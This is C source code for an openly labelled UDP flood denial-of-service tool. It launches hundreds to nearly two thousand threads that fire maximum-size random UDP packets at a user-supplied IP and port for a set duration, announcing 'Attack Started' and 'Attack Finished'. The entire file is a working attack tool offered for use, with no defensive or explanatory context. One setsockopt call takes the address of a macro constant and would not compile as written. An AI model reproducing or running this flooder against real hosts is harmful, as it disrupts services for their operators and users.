#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <pthread.h>
#include <errno.h>

#define PAYLOAD_SIZE 65507    // Max UDP Payload Size
#define RANDOM_STRING_SIZE 65500  // Max Random String Size
#define SOCKET_BUFFER_SIZE 1048576  // 1MB Buffer

typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

// Generate a random string
void generate_random_string(char *buffer, size_t size) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789/";
    for (size_t i = 0; i < size; i++) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buffer[size] = '\0'; 
}

// Function to send UDP packets
void* send_udp_packets(void* arg) {
    AttackParams *params = (AttackParams *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char *payload = malloc(PAYLOAD_SIZE);

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Increase Socket Buffer Size
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &SOCKET_BUFFER_SIZE, sizeof(SOCKET_BUFFER_SIZE));
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &SOCKET_BUFFER_SIZE, sizeof(SOCKET_BUFFER_SIZE));

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    inet_pton(AF_INET, params->ip, &server_addr.sin_addr);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < params->duration) {
        generate_random_string(payload, RANDOM_STRING_SIZE);
        
        if (sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
        }
    }

    free(payload);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    AttackParams params;
    strncpy(params.ip, (argc >= 2) ? argv[1] : "127.0.0.1", sizeof(params.ip) - 1);
    params.port = (argc >= 3) ? atoi(argv[2]) : 80;
    params.duration = (argc >= 4) ? atoi(argv[3]) : 60; 

    srand(time(NULL));

    int thread_count = (rand() % 1500) + 500;

    printf("🚀 Attack Started: IP=%s, Port=%d, Duration=%d sec, Threads=%d\n", 
           params.ip, params.port, params.duration, thread_count);

    pthread_t threads[thread_count];
    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, send_udp_packets, &params);
    }

    sleep(params.duration);
    printf("✅ Attack Finished!\n");

    return 0;
}